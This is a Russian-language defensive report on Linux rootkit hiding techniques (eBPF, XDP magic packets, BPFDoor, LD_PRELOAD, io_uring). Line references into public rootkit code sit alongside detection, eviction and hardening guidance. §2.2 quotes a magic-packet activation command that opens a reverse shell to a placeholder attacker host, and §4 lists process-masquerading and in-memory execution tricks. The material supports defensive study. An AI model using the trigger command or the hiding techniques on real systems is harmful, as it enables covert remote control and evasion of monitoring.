# techniks.md — Современные техники сокрытия и изгнания атакующего
**Guard AI Bot / Defensive Agent · Linux Ubuntu/Debian · состояние на 2025–2026**
Скоуп: только отчёт. Без скриптов. Разбор образцов + свежие публичные исследования (LinkPro, BPFDoor, Symbiote, Scales, Medusa, SPiCa, io_uring-руткиты) **с привязкой к коду на GitHub**.

> **Методика привязки к строкам.** Номера строк посчитаны по полному тексту файлов на момент чтения (sha commit'а указан в §9). Возможна погрешность ±1–2 строки; первичный ориентир — **якорь** (имя функции / литерал), по нему позицию легко проверить поиском в файле. Для `bpfdoor.c` прочитаны строки 1–484 из ~800; дальше — по публичным отчётам Trend Micro / Sandfly / Qualys. Для закрытых имплантов (LinkPro, Symbiote, SPiCa, Scales) публичного кода нет — даны ссылки на аналитику и на ближайшие публичные аналоги.

---

## 1. Контекст: кто с кем воюет

Атакующий после получения root ставит имплант, который:
1. **прячет себя** (процессы, файлы, сокеты, свои eBPF-объекты);
2. **слепит защитника** (глушит телеметрию EDR/Falco/Tracee/Tetragon);
3. **держит канал** (XDP/TCP/UDP/ICMP-триггеры, magic-пакеты);
4. **переживает reboot** (pinning в bpffs, ld.so.preload, LKM, systemd-юниты).

Guard-агент должен уметь три вещи: **(А)** видеть сквозь маскировку (cross-view, канарейки, внешние пробы), **(Б)** самому быть незаметным для атакующего (defensive stealth), **(В)** изгонять имплант в правильном порядке, не оставив атакующему окна на переперсистенцию.

Ключевая проблема 2025–2026: **ядро больше не доверенный свидетель**. Если атакующий на eBPF/LKM-рутките, локальные инструменты (`ps`, `ls`, `bpftool`, `netstat`) показывают то, что руткит разрешает. Все методы ниже построены на **расхождении каналов** (cross-view) и **независимых сигналах** (внешние пробы, NMI, память).

---

## 2. Разбор предоставленных образцов (с номерами строк)

### 2.1 cotsom/eBPF-rootkit — `bpf.c` (352 строки, sha `f76a07e`)
Файл: https://github.com/cotsom/eBPF-rootkit/blob/main/bpf.c

| Строки | Якорь | Что делает |
|---|---|---|
| 15–19 | `rb SEC(".maps")` | RingBuf 256 KB — события об успешном патче в юзерспейс |
| 21–27 | `map_buffs` | hash-map: адреса буферов `getdents64` по pid_tgid |
| 29–36 | `map_bytes_read` | счётчик позиции для поиска по чанкам |
| 38–44 | `map_prog_array` | PROG_ARRAY для tail-calls (обход лимита верификатора) |
| 46–52 | `map_to_patch` | адрес предыдущего dirent для патча |
| 54–62 | `target_ppid`, `pid_to_hide` | volatile const — PID жертвы; видны в секции `.rodata` ELF |
| 71–93 | `handle_getdents_enter` | tracepoint `sys_enter_getdents64`: запомнить адрес буфера |
| 95–165 | `handle_getdents_exit` | tracepoint `sys_exit_getdents64`: поиск папки `/proc/<pid>` по чанкам по 200 записей |
| 133–134 | `bpf_probe_read_user(&d_reclen…)` | чтение `d_reclen` и имени из юзерспейс-буфера |
| 149, 159 | `bpf_tail_call(… PROG_02 / PROG_01)` | прыжок на патч / цикл по следующему чанку |
| 167–215 | `handle_getdents_patch` | сам патч: «растягивание» `d_reclen` предыдущей записи |
| 193, 196 | `bpf_printk("[PID_HIDE] …")` | **IOC-маркеры** в `trace_pipe` |
| 199–200 | `bpf_probe_write_user(&dirp_previous->d_reclen…)` | запись в юзерспейс-память — ядро логирует её в syslog |
| 202–210 | `bpf_ringbuf_reserve(&rb…)` | событие `success` в юзерспейс |
| 217–222 | `xdprb SEC(".maps")` | второй RingBuf 16 MB для сниффера |
| 224–245 | `is_tcp()` | фильтр IPv4/TCP |
| 247–352 | `xdp_pass` | XDP-программа: пассивный сниффер TCP-пейлоада (до 64 байт, строки 318–346), `bpf_printk("Captured TCP payload…")` на 349 |

**Итог:** скрытие PID через патч `d_reclen` в буфере `getdents64` (ядро честно скопировало список — eBPF правит буфер уже в юзерспейсе, на kretprobe-этапе) + пассивный XDP-сниффер. **Слабое место:** руткит не скрывает сам себя — tracepoint-программы видны в `bpftool prog list`, маркеры `[PID_HIDE]` остаются в `trace_pipe`.

### 2.2 putaom0l1/ebpf_xdp_backdoor — `xdp_blackdoor_s1mple.c` (210 строк, sha `8e65d91`)
Файл: https://github.com/putaom0l1/ebpf_xdp_backdoor/blob/main/xdp_blackdoor_s1mple.c

| Строки | Якорь | Что делает |
|---|---|---|
| 21–24 | `START_PAYLOAD "HACKE_BY_PUTAO"`, `END_PAYLOAD "END"`, `XDP_DROP` | константы триггера |
| 33, 35, 39–40 | `PAYLOAD_SIXE 200`, `CMD_SIZE 100`, `START_LEN/END_LEN` | пакет ровно 200 байт, команда до 100 символов |
| 43–48 | `struct blackdoor_command` | `cmd[100]` + флаг `processed` (47) |
| 49–55 | `commands SEC(".maps")` | hash-map ядро→юзерспейс, max 10 записей |
| 60–69 | `my_strncmp()` | безопасное сравнение строк для верификатора |
| 72–73 | `SEC("xdp") int blackdoor_s1mple` | входная точка |
| 82–152 | проверки | eth+ip+udp (82), IPv4 (96), UDP (116), длина UDP (138), границы 200 байт (142, 149) |
| 156–158 | `my_strncmp(payload, START_PAYLOAD, START_LEN)` | проверка магического префикса |
| 163–171 | `for (… payload[i] == 'E' && …)` | поиск маркера `END` |
| 178–179 | `bpf_trace_printk("[blackdoor] Found activation packet!…")` | **IOC-маркер** в `trace_pipe` |
| 182–200 | `cmd_start` / копирование команды | извлечение команды из пакета |
| 204 | `bpf_map_update_elem(&commands…)` | команда в map — юзерспейс-читатель исполняет shell |
| 207 | `return XDP_DROP` | триггерный пакет дропается **до** netfilter/conntrack — стелс |

**Итог:** XDP magic-packet бэкдор. Активация: `printf %-200s 'HACKE_BY_PUTAO /bin/sh -i 2>&1|nc <attacker> 666 END' | nc <victim> 80 -u`. **Слабое место:** юзерспейс-демон-читатель map обязан жить и держать fd — он и есть цель для изгнания.

---

## 3. Современные техники сокрытия атакующего (2025–2026) — с кодом

### 3.1 eBPF-уровень (главный вектор)

#### 3.1.1 Скрытие процессов через `getdents64` (патч `d_reclen`)
- **Как работает:** ядро честно копирует список каталога в юзерспейс-буфер; на выходе сисколла (kretprobe/tracepoint-exit) eBPF-программа находит запись `/proc/<pid>` (или файла) и увеличивает `d_reclen` **предыдущей** записи так, чтобы она «накрыла» целевую — `ls`, `ps`, `pgrep`, `readdir` её не видят.
- **Где в коде:**
  - `cotsom/eBPF-rootkit/bpf.c` — **строки 95–165** (поиск, якорь `handle_getdents_exit`), **167–215** (патч, якорь `handle_getdents_patch`), запись `bpf_probe_write_user` на **199–200**;
  - **LinkPro** (Synacktiv, окт 2025) — тот же примитив: kretprobe на `getdents`, пост-сисколл-патч буфера; разбор: `salmazaime/linkpro-ebpf/article/linkpro-analysis.md`, **строки 15 и 17–24** (timeline: userspace→kernel copy→kretprobe→return);
  - публичные аналоги: `pathto/bad-bpf` (pidhide), Bloo-каталог модулей.
- **Детект:** сверка `ls /proc` со снапшотом из host-namespace (`nsenter -t 1`) или статического busybox; маркеры `bpf_printk` в `/sys/kernel/debug/tracing/trace_pipe` (у образца №1 — `[PID_HIDE]`, строки 193/196); kernel syslog на `bpf_probe_write_user`.

#### 3.1.2 Самоскрытие eBPF-объектов (bpftool-слепота)
- **Как работает:** kprobe/kretprobe на `sys_bpf`: на `BPF_PROG_GET_NEXT_ID` / `BPF_MAP_GET_NEXT_ID` / `BPF_LINK_GET_NEXT_ID` / `BPF_LINK_CREATE` вызывается `bpf_override_return(-ENOENT)` → перечисление возвращает пусто, `bpftool prog/link/map show` слеп.
- **Где в коде:** публичного кода LinkPro нет. Разбор: Synacktiv (окт 2025) — https://www.synacktiv.com/en/publications/linkpro-ebpf-rootkit-analysis; пересказ с архитектурой (модули Hide/Knock, hook `sys_bpf`): `salmazaime/linkpro-ebpf/article/linkpro-analysis.md`, **строка 15** («it also hooks sys_bpf to hide its own eBPF stuff from tools like bpftool»).
- **Детект:** канарейка — guard грузит свой тестовый prog и тут же перечисляет объекты; если канарейка не видна — syscall-слой фильтруется (LinkPro-класс). YARA/память: литералы `HIDING NEXT_ID`, `hidePrograms`, `link-pro/link-client`, `resources/libld.so`, `resources/arp_diag.ko`.

#### 3.1.3 Персистентность через pinning в bpffs
- **Как работает:** prog/map/link закреплены pin-файлами в `/sys/fs/bpf` — живут без процесса-загрузчика, переживают его смерть (и reboot, если bpffs монтируется при старте).
- **Где в коде:** в обоих образцах пиннинг не используется (объекты живут, пока жив загрузчик) — это их слабое место. У LinkPro персистентность двух уровней: eBPF-объекты + юзерспейс-служба под видом `systemd-resolveld`: бинарь `/usr/lib/.system/.tmp~data.resolveld`, юнит `/etc/systemd/system/systemd-resolveld.service`, фейковые timestamp'ы — `linkpro-analysis.md`, **строка 36**.
- **Детект:** baseline-drift по `/sys/fs/bpf` (новые pin-файлы); auditd `-w /sys/fs/bpf/ -p wa`; `bpftool prog show -f`; проверка юнитов с похожими на легитимные именами (`systemd-resolveld` ≠ `systemd-resolved`).

#### 3.1.4 Глушение телеметрии (telemetry suppression)
- **Как работает:** перехват `bpf_ringbuf_submit` / `perf_event_output` / юзерленд-`ringbuf__poll` — события Falco/Tracee/Tetragon уходят в никуда; инструменты «работают», но слепы.
- **Где в коде:** **SPiCa** — исследовательская работа, код закрыт: https://linuxsecurity.com/features/ebpf-security-tools-rootkit-evasion ; независимый разбор «EDR с override_return неотличим от руткита»: https://www.invary.com/articles/ebpf-rootkit-or-edr
- **Детект:** heartbeat-канарейка — guard генерит известное событие (тестовый exec) и проверяет его приход в SIEM за SLA; молчание при живом агенте = хост скомпрометирован. Независимые источники: NMI/PMU, внешние пробы.

#### 3.1.5 XDP-бэкдор с magic-пакетом
- **Как работает:** программа на XDP-хуке сканирует входящий трафик **до** сетевого стека; триггерный пакет кладёт команду в map и дропается — не виден в conntrack, netfilter-логах, `iptables -j LOG`.
- **Где в коде:**
  - `putaom0l1/ebpf_xdp_backdoor/xdp_blackdoor_s1mple.c` — триггер **21–24** (`HACKE_BY_PUTAO`/`END`), размер **33** (200 байт), map **49–55**, проверка префикса **156–158**, извлечение команды **182–200**, запись в map **204**, дроп **207** (`XDP_DROP`);
  - **LinkPro Knock** — TCP SYN с window size ровно **54321**, XDP+TC redirect на внутренний порт **2233** с перезаписью заголовков: `linkpro-analysis.md`, **строки 30 и 32**;
  - публичный аналог: boopkit.
- **Детект:** `bpftool net show dev <if>`, `ip -d link` (prog_id на xdp); auditd `-S bpf`; аномальные односторонние пакеты фиксированного размера; строки-триггеры в памяти/YARA.

#### 3.1.6 Classic-BPF (cBPF) сокет-фильтры — BPFDoor
- **Как работает:** фильтр через `setsockopt(SO_ATTACH_FILTER)` на raw/packet-сокет ловит magic-пакет; активация в юзерленде. Никакого eBPF-syscall — **не видно в bpftool вообще**.
- **Где в коде:** `gwillgues/BPFDoor/bpfdoor.c` (~800 строк, прочитано 1–484):
  - `struct magic_packet` (flag/ip/port/pass[14]) — **строки 84–89**;
  - RC4-шифрование канала: `rc4_init` **139–161**, `rc4` **163–183**, обёртки `cwrite`/`cread` **185–213**;
  - проверка пароля `logon` (memcmp `cfg.pass`/`cfg.pass2`) — **432–443**;
  - главный цикл `packet_loop` — **445+**; cBPF-фильтр `struct sock_filter bpf_code[]` — **461–484+**, проверки магического слова **0x7255** на строках **471** и **477** (TCP-ветки; UDP/ICMP-вариант с **0x5293** — ниже по файлу, за пределами прочитанного фрагмента; подтверждено отчётом Fortinet);
  - IOC из отчётов: маскарадинг argv (`/sbin/udevd -d`, `dbus-daemon --system`), артефакты `/var/run/initd.lock`, `/var/run/haldrund.pid`, исполнение из `/dev/shm`.
- **Symbiote** (обновления 2025: IPv6, порты 43253/43753/63424/26424) — код закрыт: https://www.fortinet.com/blog/threat-research/new-ebpf-filters-for-symbiote-and-bpfdoor-malware
- **Детект:** `/proc/net/packet`, `ss -0unp`, `lsof` на raw-сокеты; поиск байткода-магии 0x7255/0x5293 в памяти процессов; hunting-гайд Sandfly: https://sandflysecurity.com/blog/bpfdoor-detection-analysis-and-hunting-tactics-on-linux

#### 3.1.7 Перехват чужих BPF-фильтров (Symbiote)
- **Как работает:** хук на `setsockopt`: перед юзерским фильтром дописывается свой байткод → tcpdump и NDR слепы.
- **Где в коде:** закрыт (Symbiote не публиковался). Описание — Fortinet (ссылка выше).
- **Детект:** трассировка `setsockopt(SO_ATTACH_FILTER)`; сравнение дамп-байткода фильтров с ожидаемым; расхождение «tcpdump пишет — трафик есть» vs зеркала.

#### 3.1.8 Патч текста в `/proc` и `/sys` (bad-bpf-семейство)
- **Как работает:** `bpf_probe_write_user` переписывает содержимое виртуальных файлов при чтении (`textreplace`/`textreplace2`) — подмена статуса, счётчиков, имён.
- **Где в коде:** примитив виден в образце №1: `cotsom/eBPF-rootkit/bpf.c`, **строка 200** (`bpf_probe_write_user(&dirp_previous->d_reclen…)`). Полные модули: https://github.com/pathto/bad-bpf и разбор Bloo: https://bloo.io/blog/ebpf-rootkits-analysis-and-detection
- **Детект:** cross-view чтение через два пути (syscall vs mmap /proc); kernel syslog — ядро само логирует `bpf_probe_write_user`.

#### 3.1.9 Захват execve / sudoers (bad-bpf: exechijack, sudoadd, writeblocker)
- **Как работает:** подмена бинарника на execve; правка чтения `/etc/sudoers` на лету; тихая блокировка записи.
- **Где в коде:** https://github.com/pathto/bad-bpf (модули `exechijack`, `sudoadd`, `writeblocker`).
- **Детект:** auditd на `/etc/sudoers`; хеш бинарников до/после exec; kernel syslog на `bpf_probe_write_user`.

#### 3.1.10 LD_PRELOAD fallback (юзерленд-хвост импланта)
- **Как работает:** если `CONFIG_BPF_KPROBE_OVERRIDE` недоступен — библиотека через `/etc/ld.so.preload` хукает `getdents/readdir/stat` и чистит результаты.
- **Где в коде:**
  - **LinkPro fallback** (`libld.so`, хуки `getdents`, `getdents64`, `readdir`, `syscall`): `linkpro-analysis.md`, **строки 26–28**; ограничение — статические бинари игнорируют preload (там же);
  - **Medusa** — полноценный открытый LD_PRELOAD-руткит: https://github.com/ldpreload/Medusa — основной хук-файл `src/rkld.c` (54 KB), конфиг с кредами `src/config.c` (дефолт **adm1n/asdfasdf**, README §Building); фичи по README: PAM-бэкдор (hook libpam), скрытие процессов (hook `kill`), файлов (hook `stat`/`readdir`), сети (hook `getaddrinfo`), анти-дебаг, логирование auth через `pam_prompt`/`pam_syslog`;
  - классика: bdvl (патч самого `ld.so`).
- **Детект:** `/etc/ld.so.preload` не пуст; auditd `-w /etc/ld.so.preload -p wa`; статический busybox vs динамический `ls`; расхождение счётчика ссылок каталогов; гайд Sandfly по де-маскировке Medusa: https://sandflysecurity.com/blog/linux-medusa-rootkit-detection-and-de-cloaking

### 3.2 Уровень ядра (LKM)

| Техника | Кто / где код | Детект |
|---|---|---|
| Скрытие модуля из `lsmod` (выкидывание из списка модулей) | **Scales** (Sandfly, июнь 2026, использован в реальных атаках; eBPF+юзерленд гибрид) — код закрыт: https://sandflysecurity.com/blog/linux-scales-ebpf-rootkit-detection-and-analysis ; открытый аналог — KoviD (упомянут в отчёте Elastic) | **Cross-view по 7 структурам ядра**: Volatility-плагин **ModXRef** (CrySyS, 2025) — https://github.com/CrySyS/ModXRef , плагин `mod_xref.py` (47 KB); README: перечисление модулей из 7 источников (list, kset, tree, bug, ftrace, +2 опциональных через `--vma`) и сравнение; статья: Nagy, DFRWS US 2025 |
| Прямая манипуляция syscall table / VFS | классика | LKRG; auditd `-S init_module,finit_module`; memory forensics |
| Подмена результатов для детектора | Elastic (VB2025): из 34 руткитов 20 — kernel-space; AV-детект KoviD падал с 27/66 до ~0 — https://www.elastic.co/security-labs/threat-command/linux-rootkits-1-hooked-on-linux | Детектор, загруженный **до** руткита (initramfs); офлайн-снапшот памяти |

### 3.3 io_uring — обход сисколл-телеметрии (главный тренд 2025)

**Суть:** файловые/сетевые операции выполняются пачками через `io_uring_enter` — обычных сисколлов нет → EDR на сисколл-трейсинге (включая eBPF-агенты на `sys_enter_*`) слеп.

**Где в коде — curing (ARMO, первый публичный io_uring-руткит):** https://github.com/armosec/curing
`pkg/client/executer.go` (sha `4274e07`):
- кольцо: `iouring.New(32)` — **строка 42**;
- `handleWriteFile` — **195–264**: открытие через `iouring.Openat` (**204**), запись `iouring.Write` (**229**) — ни одного `open`/`write`;
- `handleSymlink` — **266–301**: `iouring.Symlinkat` (**272**);
- `handleReadFile` — **316–440**: `iouring.Openat` (**323**), размер через `iouring.Statx` (**349**), чтение чанками `iouring.Pread` (**398**), закрытие `iouring.Close` (**443**);
- **важное ограничение:** `handleExecute` — **303–314** — заглушка: io_uring **не умеет** exec (см. комментарий и https://github.com/axboe/liburing/discussions/1307 );
- C2-сервер `pkg/server/server.go`: gob-протокол поверх TCP (**51–52**), команда «прочитать `/etc/shadow`» (**62–65**).

**Где в коде — RingReaper (io_uring-агент обхода EDR):** https://github.com/MatheuZSecurity/RingReaper
`agent.c` (sha `102dcb2`):
- конфиг: `SERVER_IP/SERVER_PORT 443/QUEUE_DEPTH` — **строки 17–21**;
- сеть через io_uring: `send_all` **23–39** (`io_uring_prep_send` на 27), `recv_all` **41–53** (`io_uring_prep_recv` на 45);
- файлы через io_uring: `read_file_uring` **55–84** (`io_uring_prep_openat` 63, `io_uring_prep_read` 72); `cmd_get` **161–202**; `cmd_recv` **204–259**;
- **задокументированное ограничение** (автор честно пишет в комментариях): `cmd_ps` **293–326** и `cmd_kick` **337+** вынуждены использовать `opendir/readdir/readlink/kill` — io_uring не поддерживает чтение каталогов (комментарии **279–291** и **328–335**); `cmd_me` **269–277** — `getpid/ttyname` обычными сисколлами.
- **Вывод для детекта:** io_uring-агент всё равно оставляет сисколл-след в операциях, которые io_uring не покрывает (readdir, kill, частично exec) — это окно для EDR.

**Ограничения/детект:** ядра 5.1+; мониторинг самих `io_uring_setup/io_uring_enter/io_uring_register`; аномально крупные батчи; несоответствие «сетевая активность есть — сисколлов нет». **Реакция:** `sysctl kernel.io_uring_disabled=2` (ядра 6.6+; Ubuntu 24.04). Описание ARMO: https://www.armosec.io/blog/io_uring-rootkit-bypasses-linux-security

### 3.4 Сетевой сигналинг

- **Port/magic knocking** (T1205): триггерные пакеты дропаются на XDP/фильтре до стека → не видны в conntrack и netfilter-логах.
  - образец №2: UDP payload ровно 200 байт, `HACKE_BY_PUTAO…END` — `xdp_blackdoor_s1mple.c`, строки **21–24, 33, 156–171, 207**;
  - BPFDoor: magic-слова **0x7255** (TCP, строки **471/477**) и **0x5293** (UDP/ICMP) в cBPF-фильтре — `bpfdoor.c`, строки **461–484+**;
  - LinkPro Knock: TCP SYN с window **54321** → redirect на **2233** — `linkpro-analysis.md`, строки **30, 32**;
  - Symbiote: дроп-порты 43253/43753/63424/26424 (Fortinet).
- **Детект:** только вне стека — XDP/tc-счётчики (`bpftool net show`), внешние пробы (стук с другого хоста + наблюдение исходящего соединения), аномальные односторонние пакеты фиксированного размера.

---

## 4. Как guard-агенту самому прятаться (defensive stealth)

Цель — чтобы атакующий (в т.ч. с руткитом) не нашёл и не убил guard-агента раньше времени.

| # | Техника | Реализация (принципы) |
|---|---|---|
| 1 | **Статическая сборка** | Guard-бинарь линкуется статически (musl/static): не подвержен LD_PRELOAD-хукам (Medusa-класс, `src/rkld.c`), не зависит от перехваченной libc. Все рекомендации TrendAI/Sandfly по детекции требуют статических инструментов |
| 2 | **Прямые сисколлы** | Минимум libc-обёрток: прямые syscall — не перехватываются юзерленд-руткитами |
| 3 | **Маскарадинг имени** | Имя процесса/бинаря неотличимо от легитимного (kworker-стиль). Но guard должен уметь доказать легитимность (подписанный бинарь, фиксированный путь юнита) |
| 4 | **Случайный высокий PID + короткий TTL** | Короткоживущие воркеры под новым PID; основная логика — в долгоживущем процессе под легитимным именем |
| 5 | **Исполнение из памяти** | Критические модули — memfd_create + execveat, без файлов на диске; артефакты только в tmpfs |
| 6 | **hidepid и mount-namespace** | Служебные файлы в private namespace; проверка системы — всегда из host-namespace (`nsenter -t 1`), иначе сам ослеплён |
| 7 | **Watchdog + канарейка себя** | Таймер перезапускает guard; периодическая самопроверка: хеш бинаря, TracerPid: 0 в `/proc/self/status` |
| 8 | **Анти-тампер** | `prctl(PR_SET_DUMPABLE, 0)`; контроль ptrace-аттачей; защита своих файлов |
| 9 | **Не доверять локальной телеметрии** | `/proc` и `bpftool` сверять с внешним каналом: снапшоты на удалённый коллектор (syslog/TLS), сравнение на сервере. Байтовое совпадение вывода при активной системе — признак подмены |
| 10 | **Ранний старт** | systemd-юнит с `DefaultDependencies=no`, earliest boot; в идеале initramfs — до загрузки руткита |

**Чего НЕ делать guard-агенту:**
- Не использовать `bpf_override_return` для самозащиты — тот же примитив, что у LinkPro; Invary показывает: EDR с override_return выглядит для детекторов как руткит.
- Не полагаться на скрытие как на единственную защиту: guard, спрятанный теми же техниками, что атакующий, не сможет доверять собственным наблюдениям.

---

## 5. Как выкинуть атакующего (eviction playbook)

### 5.1 Правильный порядок (freeze → detach → unpin → delete → kill)

Ошибка №1 — убить юзерспейс-загрузчик **первым**: pin в bpffs переживёт смерть процесса, имплант продолжит работать «бессмертным». Порядок:

1. **Изоляция хоста** (сначала!): отключить от сети (не выключать — память нужна для форензики).
2. **Freeze юзерспейса атакующего**: `SIGSTOP` (не kill!) процессам-загрузчикам и читателям map. Ищутся по: fd на `/sys/fs/bpf/*`, fd на bpf-maps, процессам из `/dev/shm` (BPFDoor копирует себя туда — `bpfdoor.c`, строки **407–430**, якорь `to_open`), процессам с подменённым argv (якорь `set_proc_name`, строки **370–405**).
3. **Detach от хуков**: XDP `bpftool net detach xdp dev <if>`; tc `tc filter del … ingress/egress` + `tc qdisc del dev <if> clsact`; kprobe/tracepoint `bpftool link delete id <id>`; cBPF-фильтры — убить владельца сокета (BPFDoor/Symbiote-класс).
4. **Unpin**: удалить pin-файлы из `/sys/fs/bpf/...`. Только после detach.
5. **Delete объектов**: `bpftool prog delete id <id>`, `bpftool map delete` (map сначала дампнуть как улику).
6. **Kill юзерспейса**: SIGKILL замороженным.
7. **Юзерленд-хвосты**: очистить `/etc/ld.so.preload` (LinkPro `libld.so`, Medusa), удалить preload-библиотеки, проверить systemd-юниты (fake `systemd-resolveld` — `linkpro-analysis.md`, строка 36), cron, udev-правила, `/dev/shm`.
8. **Верификация**: `bpftool prog/link/map/net show` — пусто или только легитимное; повторный снапшот через 5 и 30 минут.
9. **Восстановление легитимных eBPF-компонентов** (мониторинг, CNI) — последними.
10. **Если bpftool слеп** (LinkPro-класс): детектор/очистка с раннего boot (initramfs) или внешнего носителя; в крайнем случае — офлайн-форензика памяти (Volatility + ModXRef: `mod_xref.py`, cross-view по 7 структурам) и пересборка хоста из чистого образа. **Пересборка — правильный дефолт** для kernel-компромисса.

### 5.2 Признак «имплант слепит bpftool» → менять план
- Канарейка-программа загружена, но не видна в перечислении → syscall-слой фильтруется (LinkPro-класс).
- `bpftool prog show` вернул меньше объектов, чем в baseline → то же.
- События guard перестали доходить до SIEM при живом агенте → telemetry suppression (SPiCa-класс) → телеметрия скомпрометирована, внешние пробы и память.

### 5.3 Улики (до изгнания)
- Дамп всех карт: `bpftool map dump` (команды атакующего, триггеры, PID-листы).
- Дамп памяти процессов-читателей map до kill.
- Копия `/sys/fs/bpf` (список pin-файлов), `trace_pipe` (маркеры `[PID_HIDE]`, `[blackdoor] Found activation packet!`), kernel syslog (`bpf_probe_write_user`).
- Снапшот памяти целиком (LiME) для офлайн-анализа ModXRef.
- Для BPFDoor: поиск процессов с argv `/sbin/udevd -d` / `dbus-daemon --system`, файлов `/var/run/initd.lock`, `/var/run/haldrund.pid`, исполнимых из `/dev/shm` с timestamp 30.10.2008 (`bpfdoor.c`, строки **220–231**, константа 1225394236).

---

## 6. Сводная детекция: cross-view + канарейки

| Проверка | Что сравнивать | Ловит |
|---|---|---|
| `ls /proc` (динамический) vs снапшот из host-ns / статического busybox | скрытые PID | getdents-класс, LD_PRELOAD |
| `bpftool prog/link/map show` vs baseline + канарейка | скрытые BPF-объекты | LinkPro-класс |
| Счётчики XDP/tc на интерфейсе vs стековые счётчики | дропы до стека | XDP-бэкдоры |
| Сисколл-телеметрия vs сетевая активность | активность без сисколлов | io_uring (curing, RingReaper) |
| Kernel syslog на `bpf_probe_write_user` | легитимные ли вызовы | textreplace, sudoadd, getdents-патч |
| `/proc/net/packet`, raw-сокеты, `/dev/shm` | cBPF-фильтры, исполнение из shm | BPFDoor, Symbiote |
| `/etc/ld.so.preload`, счётчик ссылок каталогов | юзерленд-хуки | Medusa, bdvl, LinkPro fallback |
| Heartbeat-событие guard → SIEM за SLA | молчание телеметрии | SPiCa-класс |
| `tainted`-флаг vs список модулей; Volatility+ModXRef | скрытые LKM | Scales, KoviD |

---

## 7. Hardening Ubuntu/Debian (превентивно)

| Мера | Значение | Эффект |
|---|---|---|
| `kernel.unprivileged_bpf_disabled` | `1` (или `2` в новых ядрах) | eBPF только для CAP_BPF — отсекает unprivileged-импланты |
| `kernel.io_uring_disabled` | `2` (ядра 6.6+; Ubuntu 24.04) | закрывает io_uring-обход телеметрии (curing/RingReaper-класс) |
| `kernel.kptr_restrict` / `kernel.dmesg_restrict` | `2` / `1` | атакующий не читает kernel-указатели и логи |
| `kernel.modules_disabled` | `1` **после** загрузки нужных модулей | LKM-руткиты невозможны (необратимо до reboot) |
| `module.sig_enforce` | `1` (+ Secure Boot) | неподписанные модули не загрузятся |
| `kernel.kexec_load_disabled` | `1` | запрет подмены ядра на лету |
| `kernel.yama.ptrace_scope` | `2–3` | защита от инъекций в guard-агента |
| auditd | `-S bpf`, `-S init_module,finit_module`, `-w /sys/fs/bpf/ -p wa`, `-w /etc/ld.so.preload -p wa`, `-w /etc/sudoers -p wa` | фиксация загрузки/патчинга |
| AppArmor | профиль для guard-агента (deny ptrace, deny write в /sys/fs/bpf) | ограничение собственного бласт-радиуса |
| Kernel lockdown (integrity/confidentiality) | через lockdown-lsm | блокировка kexec/PCI-MSI-векторов |

Ubuntu 24.04 LTS дополнительно: ограничения unprivileged user namespaces, AppArmor 4, бинарный харденинг — включать по умолчанию.

---

## 8. Соответствие MITRE ATT&CK

Полная таблица «техника → детект → реакция» — в `ttp_table.md` (10 техник). Краткая карта:

- T1014 (Rootkit), T1564.001 (Hidden Files) — getdents-класс, LKM-скрытие
- T1562.001 (Impair Defenses) — самоскрытие BPF-объектов, telemetry suppression, io_uring
- T1205 (Traffic Signaling) — XDP magic-packet, cBPF-фильтры (BPFDoor/Symbiote), LinkPro Knock
- T1505.003 / T1546 (Event Triggered Execution) — pinning-персистентность, fake systemd-юниты
- T1574.006 (LD_PRELOAD) — LinkPro fallback, Medusa, bdvl
- T1059.004 / T1095 — командный канал через BPF map / gob-TCP (curing)

---

## 9. Источники

**Образцы (разобраны построчно):**
- https://github.com/cotsom/eBPF-rootkit/blob/main/bpf.c (sha `f76a07e`, 352 строки)
- https://github.com/putaom0l1/ebpf_xdp_backdoor/blob/main/xdp_blackdoor_s1mple.c (sha `8e65d91`, 210 строк)

**Публичный код имплантов (привязка в §3):**
- BPFDoor (reimplementation): https://github.com/gwillgues/BPFDoor — `bpfdoor.c` (sha `5822344`, ~800 строк, прочитано 1–484)
- RingReaper (io_uring-агент): https://github.com/MatheuZSecurity/RingReaper — `agent.c` (sha `102dcb2`)
- curing (io_uring-руткит, ARMO): https://github.com/armosec/curing — `pkg/client/executer.go` (sha `4274e07`), `pkg/server/server.go` (sha `c60c545`)
- Medusa (LD_PRELOAD-руткит): https://github.com/ldpreload/Medusa — `src/rkld.c`, `src/config.c`, README (sha `d25da82`)
- bad-bpf (textreplace/exechijack/sudoadd): https://github.com/pathto/bad-bpf
- ModXRef (Volatility3-плагин скрытых LKM): https://github.com/CrySyS/ModXRef — `mod_xref.py`, README (sha `6cd1b17`); статья: https://www.crysys.hu/~rnagy/publications/files/Nagy2025DFRWSUS.pdf
- Разбор LinkPro (третья сторона): https://github.com/salmazaime/linkpro-ebpf — `article/linkpro-analysis.md` (sha `10d15ce`, 36 строк)

**Свежие исследования (2025–2026):**
- Synacktiv — LinkPro: eBPF rootkit analysis (окт 2025): https://www.synacktiv.com/en/publications/linkpro-ebpf-rootkit-analysis
- Datadog Security Labs — Detection primitives for eBPF rootkits (июль 2026): https://securitylabs.datadoghq.com/articles/detection-primitives-for-ebpf-rootkits
- Sandfly — BPFDoor Detection, Analysis and Hunting (февр 2026): https://sandflysecurity.com/blog/bpfdoor-detection-analysis-and-hunting-tactics-on-linux
- Sandfly — Linux Scales eBPF Rootkit Detection (июнь 2026): https://sandflysecurity.com/blog/linux-scales-ebpf-rootkit-detection-and-analysis
- Sandfly — Linux Medusa Rootkit Detection and De-Cloaking (июль 2025): https://sandflysecurity.com/blog/linux-medusa-rootkit-detection-and-de-cloaking
- Fortinet FortiGuard — New eBPF Filters for Symbiote and BPFdoor Malware (2025): https://www.fortinet.com/blog/threat-research/new-ebpf-filters-for-symbiote-and-bpfdoor-malware
- Trend Micro — BPFDoor's Hidden Controller (2025): https://www.trendmicro.com/en_us/research/25/d/bpfdoor-hidden-controller.html
- MITRE ATT&CK — BPFDoor (S1161): https://attack.mitre.org/software/S1161/
- Elastic Security Labs — Hooked on Linux, ч.1 и ч.2 (таксономия руткитов, io_uring, VB2025): https://www.elastic.co/security-labs/threat-command/linux-rootkits-1-hooked-on-linux ; https://www.elastic.co/security-labs/threat-command/linux-rootkits-2-caught-in-the-act
- ARMO — io_uring Rootkit Bypasses Linux Security Tools: https://www.armosec.io/blog/io_uring-rootkit-bypasses-linux-security
- Bloo — eBPF Rootkits: Analysis & Detection: https://bloo.io/blog/ebpf-rootkits-analysis-and-detection
- LinuxSecurity — Is Your eBPF Security Tool Deceiving You (SPiCa): https://linuxsecurity.com/features/ebpf-security-tools-rootkit-evasion
- Invary — eBPF Rootkit or EDR: https://www.invary.com/articles/ebpf-rootkit-or-edr
